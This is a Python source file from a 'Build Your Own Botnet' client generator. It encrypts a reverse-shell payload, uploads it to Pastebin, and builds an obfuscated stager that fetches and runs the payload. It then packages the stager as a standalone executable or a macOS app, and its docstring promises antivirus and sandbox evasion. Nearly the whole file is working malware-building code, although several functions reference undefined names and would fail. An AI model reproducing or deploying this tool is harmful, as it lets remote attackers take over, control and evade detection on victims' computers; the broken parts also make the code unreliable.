#!/usr/bin/python
"""
Client Generator (Build Your Own Botnet)

 - bypass firewalls - utilizes outgoing connections
   (i.e. reverse TCP shells) which most firewall
   filters allow by default
 
 - evades antivirus - blocks any spawning process
   with names of known antivirus products
 
 - prevent analysis - encrypts main client payload
   with a random 256-bit key
 
 - avoid detection - abort execution if if a virtual
   environment is detected
 
 - zero dependencies - not even Python is required to run
   a client because a Python interpreter is compiled with it
   into a standalone executable into a standalone executable
   
 - unlimited features - import any packages or custom modules
   hosted the server as if they were installed locally
     
 - platform independent - compatible with PyInstaller and
   package is authored in Python, a platform agnostic language
"""
from __future__ import print_function

# standard library

import os
import sys
import json
import zlib
import base64
import random
import urllib
import urllib2
import marshal
import logging
import requests
import argparse
import subprocess

# optional color module 

try:
    import colorama
except ImportError:
    pass

# globals

colorama.init(autoreset=False)
_debug  = True
_quiet  = False
_logger = logging.getLogger(__name__)
_logger.addHandler(logging.StreamHandler())

def _randvar(n):
    global _logger
    try:
        assert isinstance(n, int)
        return str().join([random.choice(list(string.ascii_lowercase) + list(string.digits)) for _ in range(int(n))])
    except Exception as e:
        _logger.debug(e)

def _print(output):
    global _quiet
    if not _quiet:
        print(output)
    
def pastebin(source, api_dev_key=None, api_user_key=None):
    """ 
    Upload file/data to Pastebin

    `Required`
    :param str source:         data or readable file-like object
    :param str api_dev_key:    Pastebin api_dev_key

    `Optional`
    :param str api_user_key:   Pastebin api_user_key
    
    """
    global _logger
    try:
        if api_dev_key:
            info={'api_option': 'paste', 'api_paste_code': normalize(source), 'api_dev_key': api_dev_key}
            if api_user_key:
                info.update({'api_user_key'  : api_user_key})
            data = urllib.urlencode(data)
            req  = urllib2.Request('https://pastebin.com/api/api_post.php', data=data)
            return urllib2.urlopen(req).read()
            return '{}/raw/{}'.format(os.path.split(paste)[0], os.path.split(paste)[1]) if paste.startswith('http') else paste
        else:
            return "No Pastebin API key found"
    except Exception as e:
        _logger.error('Method {} returned error: {}'.format(pastebin.func_name, str(e)))

def encrypt(plaintext, key, block_size=8, key_size=16, num_rounds=32, padding=chr(0)):
    """
    Encrypt data using classic XOR encryption

    `Required`
    :param str plaintext:       data to encrypt
    :param str key:             128-bit key

    `Optional`
    :param int block_size:      block size
    :param int key_size:        key size
    :param int num_rounds:      number of rounds
    """
    global _logger
    try:
        data    = bytes(plaintext) + (int(block_size) - len(bytes(plaintext)) % int(block_size)) * bytes(padding)
        blocks  = [data[i * block_size:((i + 1) * block_size)] for i in range(len(data) // block_size)]
        vector  = os.urandom(8)
        result  = [vector]
        for block in blocks:
            block   = bytes().join(chr(ord(x) ^ ord(y)) for x, y in zip(vector, block))
            v0, v1  = struct.unpack("!2L", block)
            k       = struct.unpack("!4L", key[:key_size])
            sum, delta, mask = 0L, 0x9e3779b9L, 0xffffffffL
            for round in range(num_rounds):
                v0  = (v0 + (((v1 << 4 ^ v1 >> 5) + v1) ^ (sum + k[sum & 3]))) & mask
                sum = (sum + delta) & mask
                v1  = (v1 + (((v0 << 4 ^ v0 >> 5) + v0) ^ (sum + k[sum >> 11 & 3]))) & mask
            output  = vector = struct.pack("!2L", v0, v1)
            result.append(output)
        return base64.b64encode(bytes().join(result))
    except Exception as e:
        _logger.error('Method {} returned error: {}'.format(encrypt.func_name, str(e)))

def exe(options, filename, payload='templates/stager.py'):
    """
    Compile the Python stager file into a standalone executable
    with a built-in Python interpreter

    `Required`
    :param options:         argparse.Namespace object
    :param str filename:    target filename
    :param str payload:     stager filename
    """
    global _logger
    try:
        filename= os.path.join(os.path.expandvars('%TEMP%') if os.name is 'nt' else '/tmp', filename)
        pyname  = os.path.basename(filename)
        name    = os.path.splitext(pyname)[0]
        dist    = os.path.dirname(filename)
        key     = util.variable(16)
        icon    = options.icon if os.path.isfile('resources/icon/%s.ico' % options.icon) else None
        pkgs    = list(set([i.strip().split()[1] for i in open(filename).read().splitlines() if len(i.strip().split()) if i.strip().split()[0] == 'import'] + [i.strip().split()[1] for i in open(payload,'r').read().splitlines() if len(i.strip().split()) if i.strip().split()[0] == 'import' if len(str(i.strip().split()[1])) < 35]))
        spec    = open('resources/pyinstaller.spec','r').read().replace('[HIDDEN_IMPORTS]', str(pkgs)).replace('[ICON_PATH]', icon).replace('[PY_FILE]', pyname).replace('[DIST_PATH]', dist).replace('[NAME]', name).replace('[128_BIT_KEY]', key)
        fspec   = os.path.join(dist, name + '.spec')
        with file(fspec, 'w') as fp:
            fp.write(spec)
        make  = subprocess.Popen('%s -m PyInstaller %s' % (sys.executable, fspec), 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True)
        exe   = os.path.join(os.path.join(dist, 'dist'), name + ('.exe' if os.name == 'nt' else ''))
        _  = map(util.delete, (filename, fspec, os.path.join(dist, 'build')))
        return exe
    except Exception as e:
        _logger.error('Method {} returned error: {}'.format(exe.func_name, str(e)))

def app(options, filename):
    """
    Bundle the Python stager file into a Mac OS X application

    `Required`
    :param options:         argparse.Namespace object
    :param str filename:    target filename
    """
    global _logger
    try:
        iconFile        = options.icon if os.path.isfile('resources/icon/%s.ico' % options.icon) else None
        version         = '%d.%d.%d' % (random.randint(0,3), random.randint(0,6), random.randint(1, 9))
        baseName        = os.path.basename(filename)
        bundleName      = os.path.splitext(baseName)[0]
        pkgPath         = os.path.join(basePath, 'PkgInfo')
        appPath         = os.path.join(os.getcwd(), '%.app' % bundleName)
        basePath        = os.path.join(appPath, 'Contents')
        distPath 	    = os.path.join(basePath, 'MacOS')
        rsrcPath        = os.path.join(basePath, 'Resources')
        plistPath       = os.path.join(rsrcPath, 'Info.plist')
        iconPath        = os.path.basename(iconFile)
        executable      = os.path.join(distPath, filename)
        bundleVersion   = '%s %s'  % (bundleName, version)
        bundleIdentity  = 'com.%s' % bundleName
        infoPlist       = open('resources/app.plist').read() % (baseName, bundleVersion, iconPath, bundleIdentity, bundleName, bundleVersion, version)
        os.makedirs(distPath)
        os.mkdir(rsrcPath)
        with file(pkgPath, "w") as fp:
            fp.write("APPL????")
        with file(plistPath, "w") as fw:
            fw.write(infoPlist)
        os.rename(filename, os.path.join(distPath, baseName))
        return appPath
    except Exception as e:
        _logger.error('Method {} returned error: {}'.format(app.func_name, str(e)))

def py(options, payload='templates/payload.py', stager='templates/stager.py'):
    """
    Generate the main Python stager

    `Required`
    :param options:         command line arguments (argparse.Namespace object)
    :param str payload:     payload filename (default: template/payload.py)
    :param str stager:      payload stager file template (default: templates/stager.py)
    """
    global _logger
    key  = base64.b64encode(os.urandom(16))
    name = options.name or 'byob_%s' % _randvar(3) 
    with open(payload, 'r') as fp:
        load = fp.read()
    load = load + "\n\nif __name__ == '__main__':\n    globals()['_shell'] = Shell(host='{}', port={}, **{})\n    globals()['_shell'].run()".format(options.host, options.port)
    code = encrypt(load, base64.b64decode(key), block_size=8, key_size=16, num_rounds=32, padding=chr(0))
    diff = round(float(100.0 * float(float(len(code))/float(len(load)) - 1.0)))
    _print(colorama.Fore.GREEN + colorama.Style.BRIGHT + "[+] " + colorama.Fore.RESET + "Payload encryption complete")
    _print(colorama.Fore.RESET + colorama.Style.DIM    + "    (Plaintext {:,} bytes {} to ciphertext {:,} bytes ({}% {})".format(len(load), 'increased' if len(code) > len(load) else 'reduced', len(code), diff, 'larger' if len(code) > len(load) else 'smaller').ljust(80 - len("[+] ")))
    load = code
    link = pastebin(load)
    _print(colorama.Fore.GREEN + colorama.Style.BRIGHT + "[+] " + colorama.Fore.RESET + "Upload to Pastebin complete")
    _print(colorama.Fore.RESET + colorama.Style.DIM    + "    ({:,} bytes uploaded to: {}".format(len(load), link).ljust(80 - len("[+] ")))
    with open(stager, 'r') as fp:
        stag = fp.read().replace('__URL__', link).replace('__KEY__', key)
    temp = os.path.join(os.path.expandvars('%TEMP%') if os.name is 'nt' else '/tmp', 'byob_%s.py' % _randvar(3))
    with file(temp, 'w') as fp:
        fp.write(stag)
    obfs = subprocess.call('pyminifier --output={} --obfuscate-classes --obfuscate-methods --obfuscate-variables --obfuscate-builtins --replacement-length=1 {}'.format(name, temp), shell=True)
    if not os.path.isfile(name):
        raise Exception('Obfuscated output file not found')
    with open(name, 'r') as fp:
        stag = fp.read()
    code = "import zlib,base64,marshal;exec marshal.loads(zlib.decompress(base64.b64decode({})))".format(repr(base64.b64encode(zlib.compress(marshal.dumps(compile(stag, '', 'exec')), 9))))
    diff =  round(float(100.0 * float(1.0 - float(len(code))/float(len(stag)))))
    _print(colorama.Fore.GREEN + colorama.Style.BRIGHT + "[+] " + colorama.Fore.RESET + "Stager obfuscation and minification complete")
    _print(colorama.Fore.RESET + colorama.Style.DIM    + "    ({:,} bytes {} to {:,} bytes  ({}% {})".format(len(stag), 'increased' if len(code) > len(stag) else 'reduced', len(code), diff, 'larger' if len(code) > len(stag) else 'smaller').ljust(80 - len("[+] ")))
    stag = code
    with file(name, 'w') as fp:
        fp.write(stag)
    _print(colorama.Fore.GREEN + colorama.Style.BRIGHT + "[+] " +  colorama.Fore.RESET + "Client stager generation complete")
    _print(colorama.Fore.RESET + colorama.Style.DIM    + "    ({:,} bytes written to file: {})".format(len(stag), path).ljust(80 - len("[+] ")))
    return name

def main():
    global _debug
    global _quiet
    global _logger
    parser = argparse.ArgumentParser(prog='client.py', description="Client Generator (Build Your Own Botnet)", version='0.1.2')
    parser.add_argument('host', action='store', type=str, help='server IP to connect to', default='localhost')
    parser.add_argument('port', action='store', type=int, help='port number for connection', default=1337)
    parser.add_argument('--name', action='store', type=str, help='Output file name')
    parser.add_argument('--icon', action='store', type=str, help='A valid path file icon')
    parser.add_argument('--quiet', action='store_true', help='Quiet mode', default=False)
    parser.add_argument('--debug', action='store_true', help='Debugging mode', default=True)
    options = parser.parse_args()
    _quiet  = options.quiet
    _debug  = options.debug
    _logger.setLevel(logging.DEBUG if _debug else logging.ERROR)
    return py(options)


if __name__ == '__main__':
    main()
